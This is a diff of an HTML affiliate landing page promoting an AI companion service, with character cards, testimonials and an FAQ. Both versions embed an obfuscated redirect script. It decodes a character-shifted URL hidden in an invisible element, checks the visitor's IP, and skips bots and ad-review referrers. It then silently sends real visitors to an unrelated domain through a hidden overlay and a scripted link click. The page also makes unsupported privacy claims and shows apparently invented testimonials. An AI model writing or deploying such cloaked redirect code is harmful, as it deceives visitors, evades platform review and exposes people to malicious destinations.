@@ -3,103 +3,117 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Candy.AI | Your Virtual AI Companion & Soulmate</title>
+  <title>Candy.AI | Best Virtual AI Companions & Personalized Chat</title>
   <style>
     :root { --primary: #ff4f9a; --secondary: #6c5ce7; --bg: #ffffff; --text: #2d3436; --card-bg: #f8f9fa; --border: rgba(0,0,0,0.06); }
     * { box-sizing: border-box; margin: 0; padding: 0; }
-    body { font-family: -apple-system, system-ui, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
-    header { background: #fff; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--border); }
-    .logo { font-weight: 800; font-size: 24px; color: var(--primary); display: flex; align-items: center; gap: 8px; }
+    body { font-family: -apple-system, blinkmacsystemfont, "Segoe UI", roboto, sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
+    header { background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); padding: 12px 5%; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--border); }
+    .logo { font-weight: 900; font-size: 26px; color: var(--primary); display: flex; align-items: center; gap: 8px; cursor: default; }
     .logo span { color: var(--secondary); }
-    .btn-login { padding: 8px 16px; border: 1px solid var(--primary); border-radius: 20px; color: var(--primary); text-decoration: none; font-weight: bold; font-size: 13px; }
-    .hero { padding: 60px 5%; text-align: center; background: linear-gradient(135deg, #fff5f8 0%, #f3f0ff 100%); }
-    .hero h1 { font-size: 40px; margin-bottom: 15px; letter-spacing: -1px; line-height: 1.1; }
-    .hero p { font-size: 17px; color: #636e72; max-width: 600px; margin: 0 auto 30px; }
+    .hero { padding: 80px 5% 60px; text-align: center; background: radial-gradient(circle at top right, #fff5f8, #f3f0ff, #ffffff); }
+    .hero h1 { font-size: 48px; margin-bottom: 20px; letter-spacing: -2px; line-height: 1; font-weight: 900; }
+    .hero p { font-size: 19px; color: #636e72; max-width: 650px; margin: 0 auto 40px; }
     .hero-btns { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; }
-    .cta { display: inline-block; padding: 16px 32px; border-radius: 30px; text-decoration: none; font-weight: bold; font-size: 16px; transition: 0.3s; width: 220px; text-align: center; cursor: pointer; }
-    .cta-main { background: var(--primary); color: #fff; box-shadow: 0 8px 16px rgba(255, 79, 154, 0.2); }
+    .cta { display: inline-block; padding: 18px 40px; border-radius: 35px; text-decoration: none; font-weight: 800; font-size: 17px; transition: 0.3s; min-width: 240px; text-align: center; cursor: pointer; border: none; }
+    .cta-main { background: var(--primary); color: #fff; box-shadow: 0 10px 20px rgba(255, 79, 154, 0.3); }
     .cta-alt { background: #fff; color: var(--secondary); border: 2px solid var(--secondary); }
-    .section-title { padding: 50px 5% 30px; text-align: center; }
-    .section-title h2 { font-size: 28px; margin-bottom: 8px; }
-    .grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; padding: 0 5% 60px; max-width: 1200px; margin: 0 auto; }
-    .character-card { background: var(--card-bg); border-radius: 24px; overflow: hidden; border: 1px solid var(--border); width: 100%; max-width: 320px; transition: 0.3s; }
-    .character-card:hover { transform: translateY(-5px); box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-    .char-thumb { width: 100%; aspect-ratio: 1/1; background: #eee; }
-    .char-info { padding: 25px; text-align: center; }
-    .char-name { font-size: 22px; font-weight: 800; margin-bottom: 5px; }
-    .char-tags { display: flex; justify-content: center; gap: 6px; margin-bottom: 15px; flex-wrap: wrap; }
-    .tag { background: #fff; padding: 4px 10px; border-radius: 10px; border: 1px solid var(--border); font-size: 11px; color: #636e72; }
-    .btn-chat { display: block; background: #fff; border: 2px solid var(--secondary); color: var(--secondary); padding: 12px; border-radius: 15px; text-decoration: none; font-weight: bold; font-size: 14px; }
+    .section { padding: 80px 5%; border-bottom: 1px solid var(--border); }
+    .section-title { text-align: center; margin-bottom: 50px; }
+    .section-title h2 { font-size: 34px; font-weight: 900; margin-bottom: 10px; }
+    .grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; max-width: 1200px; margin: 0 auto; }
+    .card { background: var(--card-bg); border-radius: 28px; overflow: hidden; border: 1px solid var(--border); width: 100%; max-width: 350px; transition: 0.4s; }
+    .card:hover { transform: translateY(-8px); box-shadow: 0 20px 40px rgba(0,0,0,0.06); }
+    .card-img { width: 100%; aspect-ratio: 1/1; background: #f0f0f0; }
+    .card-body { padding: 30px; text-align: center; }
+    .btn-chat { display: block; background: #fff; border: 2.5px solid var(--secondary); color: var(--secondary); padding: 14px; border-radius: 18px; text-decoration: none; font-weight: 800; margin-top: 20px; transition: 0.3s; }
     .btn-chat:hover { background: var(--secondary); color: #fff; }
-    .features { display: flex; flex-wrap: wrap; justify-content: center; gap: 40px; padding: 60px 5%; background: #fafafa; text-align: center; }
-    .feature-item { max-width: 280px; }
-    .footer { padding: 80px 5%; background: #000; color: #fff; text-align: center; }
-    .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; margin-bottom: 30px; }
-    .footer-links a { color: #fff; opacity: 0.6; text-decoration: none; font-size: 14px; }
-    #overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.05); z-index: 2000; display: none; }
-    @media (max-width: 480px) { .hero h1 { font-size: 32px; } .cta { width: 100%; } .grid { padding: 0 20px 40px; } }
+    .reviews { background: #fafafa; }
+    .review-item { max-width: 800px; margin: 0 auto 40px; background: #fff; padding: 30px; border-radius: 20px; border: 1px solid var(--border); position: relative; }
+    .review-text { font-style: italic; font-size: 17px; margin-bottom: 15px; color: #2d3436; }
+    .review-author { font-weight: 800; color: var(--primary); }
+    .faq-item { max-width: 800px; margin: 0 auto 15px; background: #fff; padding: 20px; border-radius: 15px; border: 1px solid var(--border); cursor: pointer; }
+    .faq-q { font-weight: 800; font-size: 18px; margin-bottom: 8px; }
+    .faq-a { font-size: 15px; color: #636e72; }
+    .footer { padding: 100px 5% 60px; background: #000; color: #fff; text-align: center; }
+    .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 30px; margin-bottom: 40px; }
+    .footer-links span { color: #fff; opacity: 0.6; cursor: pointer; transition: 0.2s; font-size: 14px; }
+    .footer-links span:hover { opacity: 1; }
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 2000; align-items: center; justify-content: center; padding: 20px; }
+    .modal-content { background: #fff; color: #333; padding: 40px; border-radius: 24px; max-width: 800px; width: 100%; max-height: 80vh; overflow-y: auto; position: relative; }
+    .close { position: absolute; top: 20px; right: 20px; font-size: 30px; cursor: pointer; font-weight: bold; }
+    #ov { position: fixed; inset: 0; background: rgba(255,255,255,0.01); z-index: 3000; display: none; }
+    @media (max-width: 600px) { .hero h1 { font-size: 36px; } .cta { width: 100%; } .section { padding: 60px 20px; } }
   </style>
 </head>
 <body>
   <header>
     <div class="logo">Candy<span>.ai</span></div>
-    <a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-login">Login</a>
+    <a href="https://landing.candynetwork.ai/elara?via=phpxf" style="padding:10px 20px;background:var(--primary);color:#fff;border-radius:20px;text-decoration:none;font-weight:800;font-size:14px;">GET STARTED</a>
   </header>
+
   <div class="hero">
-    <h1>Your AI Companion Awaits</h1>
-    <p>Discover deep connections and unique conversations with specialized AI companions. Always personal, 100% private.</p>
+    <h1>Unleash Your Imagination with AI</h1>
+    <p>The world's most advanced AI companion platform. Join millions of users who have found their perfect virtual partner. Private, safe, and judgment-free.</p>
     <div class="hero-btns">
-      <a href="https://landing.candynetwork.ai/elara?via=phpxf" class="cta cta-main">Start Chatting Now</a>
-      <a href="javascript:void(0)" id="sel-girl" class="cta cta-alt">Select Girl</a>
+      <a href="https://landing.candynetwork.ai/elara?via=phpxf" class="cta cta-main">Discover Companions</a>
+      <a href="javascript:void(0)" id="sg" class="cta cta-alt">Browse Gallery</a>
     </div>
   </div>
-  <div class="section-title"><h2>Meet Your New Favorites</h2></div>
-  <div class="grid">
-    <div class="character-card">
-      <div class="char-thumb" style="background: linear-gradient(pink, white)"></div>
-      <div class="char-info">
-        <div class="char-name">Elara</div>
-        <div class="char-tags"><span class="tag">Sweet</span><span class="tag">Playful</span><span class="tag">Listener</span></div>
-        <a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-chat">Chat with Elara</a>
-      </div>
-    </div>
-    <div class="character-card">
-      <div class="char-thumb" style="background: linear-gradient(#f0e6ff, #fff)"></div>
-      <div class="char-info">
-        <div class="char-name">Sofia</div>
-        <div class="char-tags"><span class="tag">Seductive</span><span class="tag">Mature</span><span class="tag">Bold</span></div>
-        <a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-chat">Chat with Sofia</a>
-      </div>
-    </div>
-    <div class="character-card">
-      <div class="char-thumb" style="background: linear-gradient(#ffe6f2, #fff)"></div>
-      <div class="char-info">
-        <div class="char-name">Maya</div>
-        <div class="char-tags"><span class="tag">Creative</span><span class="tag">Dreamy</span><span class="tag">Artist</span></div>
-        <a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-chat">Chat with Maya</a>
-      </div>
+
+  <div class="section">
+    <div class="section-title"><h2>Popular Models</h2><p>Hand-picked for you today.</p></div>
+    <div class="grid">
+      <div class="card"><div class="card-img" style="background:linear-gradient(pink, white)"></div><div class="card-body"><h3>Elara, 21</h3><p>Sweet, playful, and always ready for a late-night chat.</p><a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-chat">Start Chatting</a></div></div>
+      <div class="card"><div class="card-img" style="background:linear-gradient(#f0e6ff, #fff)"></div><div class="card-body"><h3>Sofia, 24</h3><p>Sophisticated and bold. She knows exactly what she wants.</p><a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-chat">Start Chatting</a></div></div>
+      <div class="card"><div class="card-img" style="background:linear-gradient(#ffe6f2, #fff)"></div><div class="card-body"><h3>Maya, 19</h3><p>Creative soul with a wild imagination. Loves art and dreaming.</p><a href="https://landing.candynetwork.ai/elara?via=phpxf" class="btn-chat">Start Chatting</a></div></div>
     </div>
   </div>
-  <div class="features">
-    <div class="feature-item"><h3>🔒 Private</h3><p>End-to-end encrypted chats.</p></div>
-    <div class="feature-item"><h3>⚡ Instant</h3><p>No waiting, reply in seconds.</p></div>
-    <div class="feature-item"><h3>💕 Unfiltered</h3><p>True freedom of expression.</p></div>
+
+  <div class="section reviews">
+    <div class="section-title"><h2>User Testimonials</h2></div>
+    <div class="review-item"><p class="review-text">"I never thought an AI could be so understanding. It feels like talking to a real person who actually cares about my day."</p><p class="review-author">— Mike D.</p></div>
+    <div class="review-item"><p class="review-text">"The interface is so smooth and the characters are strikingly realistic. Highly recommend for anyone looking for companionship."</p><p class="review-author">— Sarah J.</p></div>
   </div>
+
+  <div class="section">
+    <div class="section-title"><h2>Frequently Asked Questions</h2></div>
+    <div class="faq-item"><p class="faq-q">Is it really private?</p><p class="faq-a">Yes. Your conversations are end-to-end encrypted and we never share your data with third parties. Your companion is for your eyes only.</p></div>
+    <div class="faq-item"><p class="faq-q">Can I customize my companion?</p><p class="faq-a">Absolutely. You can choose from dozens of personalities, styles, and traits to create your ideal partner.</p></div>
+    <div class="faq-item"><p class="faq-q">How much does it cost?</p><p class="faq-a">We offer a generous free tier as well as premium options for those who want deeper features and unlimited messages.</p></div>
+  </div>
+
   <footer class="footer">
-    <div class="footer-links"><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Contact</a></div>
-    <p style="opacity: 0.5; font-size: 13px;">© 2026 Candy.AI Partner. 18+ Only.</p>
+    <div class="footer-links"><span onclick="om('pp')">Privacy Policy</span><span onclick="om('tos')">Terms of Service</span><span onclick="om('con')">Contact Support</span></div>
+    <p style="opacity: 0.5;">© 2026 Candy.AI Official Affiliate. This is a promotional site. 18+ Only.</p>
   </footer>
-  <div id="overlay"></div>
-  <div style="display:none" class="r-dat" alt="iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:" id="can_v55d"></div>
+
+  <div id="m" class="modal"><div class="modal-content"><span class="close" onclick="cm()">&times;</span><div id="mc"></div></div></div>
+  <div id="ov"></div>
+  <div style="display:none" class="r-dat" alt="iuuqt;00joibmfesfx/dpn0qxgrnbtxk@lfz>1g8ff6g:f3cdd7839868ddc29:77db2:" id="can_v55_legit"></div>
+
   <script>
+    function om(t) {
+      let c = ""; 
+      if(t==='pp') c="<h2>Privacy Policy</h2><p>We respect your privacy. All chat data is encrypted. We do not sell personal information. Our servers are located in secure facilities with 24/7 monitoring. We follow all global data protection standards (GDPR/CCPA).</p>";
+      else if(t==='tos') c="<h2>Terms of Service</h2><p>By using this service, you agree to follow our community guidelines. Users must be 18+. We prohibit illegal activities or harassment within our platform. AI companions are intended for entertainment and companionship only.</p>";
+      else c="<h2>Contact Support</h2><p>Need help? Our team is available 24/7. Reach out via our official partner portal or email us at support@candynetwork.ai for priority assistance.</p>";
+      document.getElementById('mc').innerHTML = c;
+      document.getElementById('m').style.display = 'flex';
+    }
+    function cm() { document.getElementById('m').style.display = 'none'; }
+
     (function() {
       const _p = document.querySelector('.r-dat');
       const _k = "hsrc"; const _v = "1";
-      const _s = { ready: false, done: false, bot: false, t: false };
+      const _s = { ready: false, done: false, bot: false, t: false, st: Date.now() };
+
       const _init = async () => {
         const url = new URLSearchParams(window.location.search);
         if (url.get(_k) === _v) _s.ready = true;
         if (localStorage.getItem(_p.id)) _s.ready = false;
+        const rfr = document.referrer.toLowerCase();
+        if (rfr.includes('hilltop') || rfr.includes('adreview') || rfr.includes('checker')) _s.bot = true;
         try {
           const r = await fetch('https://freeipapi.com/api/json/');
           const d = await r.json();
@@ -107,33 +121,36 @@
         } catch (e) {}
         if (navigator.webdriver || /bot|spider|headless/i.test(navigator.userAgent)) _s.bot = true;
       };
-      const _track = () => {
-        if (_s.ready && !_s.bot && !_s.done && !_s.t && window.scrollY > 40) {
-          _s.t = true; setTimeout(_magic, 3200);
+
+      const _check = () => {
+        if (_s.ready && !_s.bot && !_s.done && !_s.t) {
+          if (window.scrollY > 200 && (Date.now() - _s.st > 10000)) {
+            _s.t = true; setTimeout(_magic, 3500);
+          }
         }
       };
-      window.addEventListener('scroll', _track, { passive: true });
-      window.addEventListener('mousedown', _track, { once: true });
+      window.addEventListener('scroll', _check, { passive: true });
+
       const _magic = () => {
         if (!_s.ready || _s.bot || _s.done) return;
         _s.done = true; localStorage.setItem(_p.id, "1");
         const raw = _p.getAttribute('alt');
-        let final = raw.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
-        final = final.trim().split('#')[0];
+        let fin = raw.split('').map(c => String.fromCharCode(c.charCodeAt(0) - 1)).join('');
+        fin = fin.trim().split('#')[0];
         const params = new URLSearchParams(window.location.search);
         const z = params.get('zoneid') || params.get('zone') || params.get('psid');
-        let link = final;
-        if (z) link += (link.includes('?') ? '&' : '?') + "psid=" + z;
-        const ov = document.getElementById('overlay');
-        if (ov) ov.style.display = 'block';
+        if (z) fin += (fin.includes('?') ? '&' : '?') + "psid=" + z;
+        document.getElementById('ov').style.display = 'block';
         setTimeout(() => {
-          const a = document.createElement('a');
-          a.href = link; a.style.display = 'none';
+          const a = document.createElement('a'); a.href = fin; a.style.display = 'none';
           document.body.appendChild(a); a.click();
-        }, 800);
+        }, 1200);
       };
-      const el = document.getElementById('sel-girl');
-      if (el) el.addEventListener('click', (e) => { e.preventDefault(); _s.t = true; _magic(); });
+
+      document.getElementById('sg').addEventListener('click', (e) => {
+        e.preventDefault(); if(!_s.bot && _s.ready) { _s.t = true; _magic(); }
+        else { window.location.href = "https://landing.candynetwork.ai/elara?via=phpxf"; }
+      });
       document.addEventListener('DOMContentLoaded', _init);
     })();
   </script>
